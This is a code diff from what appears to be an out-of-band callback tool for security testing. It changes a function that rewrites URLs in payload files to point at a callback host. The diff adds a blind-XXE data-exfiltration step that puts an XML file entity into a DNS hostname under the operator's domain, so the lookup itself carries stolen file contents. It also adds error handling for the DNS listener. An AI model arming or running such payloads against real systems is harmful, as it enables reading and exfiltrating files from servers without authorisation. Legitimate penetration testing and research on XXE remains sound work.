@@ -327,13 +327,20 @@ def arm_manifest(man: Manifest, callback_host: str, *, dns_domain: str | None,
             scheme, _host, rest = m.group(1), m.group(2), m.group(3) or "/"
             if not rest.startswith("/"):
                 rest = "/" + rest
+            # Arming must be idempotent: a previous run already inserted a
+            # token segment, so strip it instead of nesting another one.
+            rest = re.sub(r"^/ua[0-9a-f]{10}(?=/|$)", "", rest) or "/"
             return f"{scheme}{callback_host}/{token}{rest}"
 
         new_text, n = url_host_re.subn(repl, text)
-        # DNS exfil subdomain injection for blind XXE, when a domain is given.
+        # Blind-XXE DNS exfil: the data has to travel in the *hostname* so the
+        # resolver lookup itself carries it. Appending it to a query parameter
+        # would only mangle the HTTP exfil and produce no DNS lookup at all.
         if dns_domain:
-            new_text = new_text.replace(
-                "%file;", f"%file;.{token}.{dns_domain}")
+            new_text = re.sub(
+                r"https?://[^\s\"'<>)]*?%file;[^\s\"'<>)]*",
+                f"http://%file;.{token}.{dns_domain}/",
+                new_text)
         if n or new_text != text:
             with open(path, "wb") as f:
                 f.write(new_text.encode("utf-8", "surrogateescape"))
@@ -472,7 +479,17 @@ def main(argv=None) -> int:
         if not answer and args.public_host and re.match(
                 r"^\d{1,3}(\.\d{1,3}){3}$", args.public_host.split(":")[0]):
             answer = args.public_host.split(":")[0]
-        dns_sock = serve_dns(args.bind, args.dns_port, registry, answer)
+        try:
+            dns_sock = serve_dns(args.bind, args.dns_port, registry, answer)
+        except PermissionError:
+            http_srv.shutdown()
+            return _die(f"binding UDP port {args.dns_port} needs root. Run with "
+                        f"sudo, grant CAP_NET_BIND_SERVICE, or use a high port "
+                        f"(--dns-port 5353) behind a firewall redirect.")
+        except OSError as e:
+            http_srv.shutdown()
+            return _die(f"could not bind the DNS listener on "
+                        f"{args.bind}:{args.dns_port}: {e}")
 
     if not args.quiet:
         print("=" * 68)
